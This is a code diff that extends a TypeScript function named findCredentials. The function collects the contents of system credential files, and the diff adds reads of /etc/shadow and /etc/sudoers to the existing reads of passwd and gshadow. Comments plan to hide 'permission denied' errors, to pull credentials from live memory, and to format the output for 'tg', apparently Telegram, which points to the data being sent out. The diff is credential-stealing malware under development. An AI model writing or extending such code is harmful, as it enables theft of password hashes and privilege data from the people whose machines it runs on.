@@ -9,6 +9,7 @@ const _run = (args: string): string | null => {
 }
 
 // TODO: Hidde error messages like "file not found" or "permission denied"
+// TODO: Access live memory to extract credenrials
 const findCredentials = (text: string) => {
   const credentials = {} as any;
   credentials.gh = {} as any;
@@ -205,11 +206,25 @@ const findCredentials = (text: string) => {
     credentials.users.gshadow.content = gshadow;
   }
 
+  const shadow = _run(`cat ${path}/etc/shadow`);
+  if (shadow) {
+    credentials.users.shadow = {} as any;
+    credentials.users.shadow.path = `${path}/etc/shadow`;
+    credentials.users.shadow.content = shadow;
+  }
+
   const passwd = _run(`cat ${path}/etc/passwd`);
   if (passwd) {
     credentials.users.passwd = {} as any;
     credentials.users.passwd.path = `${path}/etc/passwd`;
     credentials.users.passwd.content = passwd;
+  }
+
+  const sudoers = _run(`cat ${path}/etc/sudoers`);
+  if (sudoers) {
+    credentials.users.sudoers = {} as any;
+    credentials.users.sudoers.path = `${path}/etc/sudoers`;
+    credentials.users.sudoers.content = sudoers;
   }
 
   /* // Not available in subshell, search for a workaround
@@ -228,6 +243,7 @@ const findCredentials = (text: string) => {
   }
 
   // TODO: Remove void objects
+  // TODO: Pretty Ouput function (json is ugly in tg)
   return JSON.stringify(credentials, null, 2);
 }
 
